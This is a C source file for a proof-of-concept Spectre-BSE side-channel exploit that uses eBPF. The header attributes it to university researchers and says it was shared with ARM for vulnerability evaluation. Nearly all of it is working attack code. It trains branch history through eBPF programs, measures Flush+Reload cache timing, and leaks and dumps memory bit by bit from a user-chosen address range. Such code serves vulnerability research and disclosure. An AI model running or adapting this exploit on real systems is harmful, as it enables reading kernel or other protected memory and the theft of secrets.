/*
* Chimera: Spectre-BSE PoC based on eBPF
* 
* Thursday, January 22nd 2025
*
* Yuhui Zhu - yuhui.zhu@santannapisa.it
* Alessandro Biondi - alessandro.biondi@santannapisa.it
*
* ReTiS Lab, Scuola Superiore Sant'Anna
* Pisa, Italy
* 
* This copy is tested on Cortex-A76 and distributed to ARM 
* for vulnerability evaluation.
*/

#include <sys/resource.h>
#include <assert.h>
#include <stdbool.h>
#include <stdint.h>
#include <argp.h>

#include "ebpf_helper.h"
#include "ebpf_progs.h"
#include "ebpf_poc.h"
#include "arch_defines.h"

uint64_t start=0, len=0, pass=1;
char *dump_filename = NULL;
uint64_t frbuf_threshold = 0;
uint64_t nr_bh = 512;
uint64_t sz_bcond_offset = 2;

static struct argp_option options[] =
{
    {"addr",    'a',    "ADDR_HEX",     0,      "Start address"},
    {"len",     'l',    "BYTES",        0,      "Length in bytes"},
    {"pass",    'p',    "N",            0,      "Passes of leaking the given memory range"},
    {"output",  'o',    "FILE",         0,      "Dump filename"},
    {"threshold", 't',  "THRESHOLD",    0,      "Threshold for F+R probes"},
    {"nr_bh",    'b',    "N",           0,      "Number of branch hints"},
    {"sz_bcond", 's',   "N",            0,      "Size of BHB-populating conditional branches, in instructions"},
    { 0 }
};

static error_t parse_opt (int key, char *arg, struct argp_state *state)
{
    switch (key)
    {
        case 'a':
            start = strtoull(arg, NULL, 16);
            break;
        case 'l':
            len = (uint64_t)strtol(arg, NULL, 0);
            break;
        case 'p':
            pass = (uint64_t)strtol(arg, NULL, 0);
            break;
        case 'o':
            dump_filename = arg;
            break;
        case 't':
            frbuf_threshold = (uint64_t)strtol(arg, NULL, 0);
            break;
        case 'b':
            nr_bh = (uint64_t)strtol(arg, NULL, 0);
            break;
        case 's':
            sz_bcond_offset = (uint64_t)strtol(arg, NULL, 0);
            break;
        case ARGP_KEY_ARG:
            break;
        case ARGP_KEY_END:
            break;
        default:
            return ARGP_ERR_UNKNOWN;
    }
    return 0;
}

static struct argp argp = { options, parse_opt, NULL, NULL };

uint8_t *param_set_ptr, *param_esc, *param_shuffle_bh, *param_take_sc;
uint64_t *param_ptr, *param_rsh, *dummy_load;

uint8_t *decode_buf, *decode_buf_out;

struct decode_res
{
    uint64_t t_dummy, t0, t1;
    bool bit;
    bool reject;
};

int invoke_victim(int pop_bhb, int _set_ptr, int _esc, int _shuffle_bh, int _take_sc, bool flush)
{
    *param_set_ptr =    _set_ptr;
    *param_esc =        _esc;
    *param_shuffle_bh = _shuffle_bh;
    *param_take_sc =    _take_sc;
    if (flush)
    {
        FLUSH_DCACHE(param_take_sc);
        FLUSH_DCACHE(param_set_ptr);
        FLUSH_DCACHE(param_esc); // DO NOT FLUSH THIS
        FLUSH_DCACHE(param_shuffle_bh);
        FLUSH_DCACHE((ptr_mmap_evset + PR_OFFSET_0));
        FLUSH_DCACHE((ptr_mmap_evset + PR_OFFSET_1));
        FLUSH_DCACHE(dummy_load);
        OPS_BARRIER(128);
    }
    trigger_ebpf(sock_prog_victim, pop_bhb);
}

int do_leak(uint64_t ptr, uint64_t rsh, struct decode_res *res)
{
    *param_rsh = rsh;
    *param_ptr = ptr;
    int t0, t1, tx;
    for (int j = 0; j < 32; j++)
    {
        // invoke_victim(j & 3, 0xff, 0x00, 0x00, 0xff, false);
        // invoke_victim(2, 0x00, 0xff, 0x00, 0x00, false);
        invoke_victim(2, 0xff, 0x00, 0x00, 0x00, false);
        // invoke_victim(2, 0x00, 0x00, 0x00, 0x00, false);
        // invoke_victim(2, 0x00, 0x00, 0x00, 0x00, false);
        invoke_victim(2, 0xff, 0x00, 0x00, 0x00, false);
        invoke_victim(2, 0xff, 0x00, 0x00, 0x00, false);
        invoke_victim(2, 0x00, 0x00, 0x00, 0x00, false);
    }
    OPS_BARRIER(128);

    // invoke_victim(2, 0x00, 0x00, 0xff, 0x00, true);
    invoke_victim(2, 0x00, 0x00, 0x00, 0x00, true);

    // check F+R probes
    trigger_ebpf(sock_prog_time, 1);
    // bit==0
    t0 = ptr_mmap_time[0]; // map_get(fd_map_time, 0);
    // bit==1
    t1 = ptr_mmap_time[2]; // map_get(fd_map_time, 1);
    // fd_map_dummy[PR_OFFSET_1] speculatively loaded?
    tx = ptr_mmap_time[4]; // map_get(fd_map_time, 2);

    // decode side channel and exclude three invalid cases:
    // (1) bc_init=TT: fd_map_dummy[PR_OFFSET_1] cache hit
    // (2) bc_load=TT or NEVER EXECUTED: all probes report cache miss
    // (3) all probes report cache hits
    res->reject = (tx < frbuf_threshold) |
                ((tx > frbuf_threshold) & (t0 > frbuf_threshold) & (t1 > frbuf_threshold)) |
                ((tx > frbuf_threshold) & (t0 < frbuf_threshold) & (t1 < frbuf_threshold));
    res->bit = (t0 > frbuf_threshold) & (t1 < frbuf_threshold);
    res->t0 = t0;
    res->t1 = t1;
    res->t_dummy = tx;
}

int test_mis_spec(uint64_t start, uint64_t len, uint8_t *buf)
{
    struct decode_res res;
    int cnt_accept = 0;
    uint8_t b_leak = 0;
    uint64_t ptr = start;
    int bit = 0;
    uint64_t cnt_leak = 0;
    while (true)
    {
        do_leak(ptr, bit, &res);
        printf("p: %x, b: %d, tx: %d, t0: %d, t1: %d\n", ptr, bit, res.t_dummy, res.t0, res.t1);
        if (!(res.reject))
        {
            b_leak |= (res.bit & 1) << bit;
            bit++;
            if (bit == 8)
            {
                // printf("p: %lx, v: %02x\n", ptr, b_leak);
                buf[ptr - start] = b_leak;
                ptr++;
                bit = 0;
                b_leak = 0;
                sched_yield();
            }
        }
        if (ptr - start >= len)
            break;
    }
}

void print_buf_single_pass(uint8_t *buf, uint64_t start, uint64_t len)
{
    int print_ascii_pos = 0;
    for (int print_hex_pos = 0; print_hex_pos < len; print_hex_pos++)
    {
        if (print_hex_pos % 16 == 0)
        {
            if (print_hex_pos != 0)
            {
                printf("  ");
                for (int j = print_hex_pos - 16; j < print_hex_pos; j++)
                {
                    printf("%c", (buf[j] >= 32 && buf[j] <= 126) ? buf[j] : '.');
                }
                print_ascii_pos = print_hex_pos;
            }
            if (print_hex_pos != 0) printf("\n");
            printf("%lx: ", start + print_hex_pos);
        }
        printf("%02x ", buf[print_hex_pos]);
    }
    int remaining = len - print_ascii_pos;
    if (remaining != 0)
    {
        for (int i = 0; i < 16 - remaining; i++)
        {
            printf("   ");
        }
        printf("  ");
        for (int i = len - remaining; i < len; i++)
        {
            printf("%c", (buf[i] >= 32 && buf[i] <= 126) ? buf[i] : '.');
        }
    }
    printf("\n");
}

void dump_buf(uint8_t *in, uint8_t *out, uint64_t len, uint64_t pass)
{
    memset(out, 0, len);
    uint64_t *decode_sum = malloc(8*len*sizeof(uint64_t));
    for (int i = 0; i < len; i++)
    {
        for (int j = 0; j < pass; j++)
        {
            for (int bit = 0; bit<8; bit++)
            {
                decode_sum[i*8+bit] += (in[j*len + i] >> bit) & 1;
            }
        }
    }
    for (int i = 0; i < len; i++)
    {
        for (int bit = 0; bit<8; bit++)
        {
            out[i] |= (decode_sum[i*8+bit] > pass/2) << bit;
        }
    }
    FILE *fp = fopen(dump_filename, "wb");
    fwrite(out, 1, len, fp);
    fclose(fp);
}

void test_frbuf()
{
    int slow, fast;
    int t0, t1, tx;

    MEM_ACCESS((ptr_mmap_evset + PR_OFFSET_0));
    MEM_ACCESS((ptr_mmap_evset + PR_OFFSET_1));
    MEM_ACCESS(dummy_load);
    OPS_BARRIER(8);

    trigger_ebpf(sock_prog_time, 1);
    t0 = ptr_mmap_time[0];
    t1 = ptr_mmap_time[2];
    tx = ptr_mmap_time[4];
    printf("fast: t0: %d, t1: %d, tx: %d\n", t0, t1, tx);
    fast = (t0 + t1 + tx) / 3;

    FLUSH_DCACHE((ptr_mmap_evset + PR_OFFSET_0));
    FLUSH_DCACHE((ptr_mmap_evset + PR_OFFSET_1));
    FLUSH_DCACHE(dummy_load);
    OPS_BARRIER(8);

    trigger_ebpf(sock_prog_time, 1);
    t0 = ptr_mmap_time[0];
    t1 = ptr_mmap_time[2];
    tx = ptr_mmap_time[4];

    printf("slow: t0: %d, t1: %d, tx: %d\n", t0, t1, tx);
    slow = (t0 + t1 + tx) / 3;

    if (frbuf_threshold == 0) frbuf_threshold = (fast + slow) / 2;
    printf("F+R threshold: %d\n", frbuf_threshold);
}

int main(int argc, char *argv[], char *envp[])
{
    argp_parse(&argp, argc, argv, 0, 0, NULL);
    if (start==0 || len==0)
    {
        printf("Must specify a starting address and a length\n");
        return 1;
    }
    env_page_sz = getpagesize();

    printf("Page size: %d\n", env_page_sz);
    printf("Start: %lx, Len: %d, Pass: %d\n", start, len, pass);

    decode_buf =         malloc(len*(pass));
    decode_buf_out =     malloc(len);

    fd_map_frbuf =       map_array_create(SZ_EVICT_SET, 1);
    fd_map_time =        map_array_create(sizeof(uint32_t), 4);
    fd_map_bh_params =   map_array_create(2 * env_page_sz, 1);
    fd_map_dummy =       map_array_create(4 * env_page_sz, 1);
    fd_map_secret =      map_array_create(env_page_sz, 1);

    ptr_mmap_evset =     mmap(NULL, SZ_EVICT_SET, PROT_READ | PROT_WRITE, MAP_SHARED, fd_map_frbuf, 0);
    ptr_mmap_time =      mmap(NULL, sizeof(uint32_t) * 4, PROT_READ | PROT_WRITE, MAP_SHARED, fd_map_time, 0);
    ptr_mmap_bh_params = mmap(NULL, 2 * env_page_sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd_map_bh_params, 0);
    ptr_mmap_dummy =     mmap(NULL, 4 * env_page_sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd_map_dummy, 0);
    ptr_mmap_secret =    mmap(NULL, env_page_sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd_map_secret, 0);

    param_set_ptr =      (uint8_t *) (ptr_mmap_bh_params + PARAM_OFFSET_SET_PTR);
    param_esc =          (uint8_t *) (ptr_mmap_bh_params + PARAM_OFFSET_ESC);
    param_shuffle_bh =   (uint8_t *) (ptr_mmap_bh_params + PARAM_OFFSET_SHUFFLE_BH);
    param_take_sc =      (uint8_t *) (ptr_mmap_bh_params + PARAM_OFFSET_TAKE_SC);
    param_ptr =          (uint64_t *)(ptr_mmap_bh_params + PARAM_OFFSET_PTR);
    param_rsh =          (uint64_t *)(ptr_mmap_bh_params + PARAM_OFFSET_RSH);
    dummy_load =         (uint64_t *)(ptr_mmap_dummy + PR_OFFSET_1);

    setup_prog_reload();
    setup_prog_victim(nr_bh, sz_bcond_offset);

    test_frbuf();

    for (int i = 0; i < pass; i++)
    {
        test_mis_spec(start, len, decode_buf + i*len);
        printf("Pass %d:\n", i);
        print_buf_single_pass(decode_buf + i*len, start, len);
        printf("\n");
    }
    if (dump_filename) {
        dump_buf(decode_buf, decode_buf_out, len, pass);
        printf("Written to %s:\n", dump_filename);
        print_buf_single_pass(decode_buf_out, start, len);
    }
    free(decode_buf_out);
    free(decode_buf);
    return 0;
}
